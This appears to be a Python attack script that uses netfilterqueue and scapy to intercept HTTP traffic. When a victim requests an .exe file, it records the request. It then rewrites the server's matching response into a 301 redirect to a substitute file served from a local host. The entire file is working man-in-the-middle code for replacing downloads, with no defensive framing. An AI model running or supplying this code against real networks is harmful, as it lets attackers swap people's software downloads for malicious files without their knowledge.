import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet , load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def no_love(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] Exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] Replacing file")
                modified_load = set_load(scapy_packet , "HTTP/1.1 301 moved permanently\nlocation: http://127.0.0.1:8080/index.html")
                packet.set_payload(str(modified_load))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0 , no_love)
queue.run()
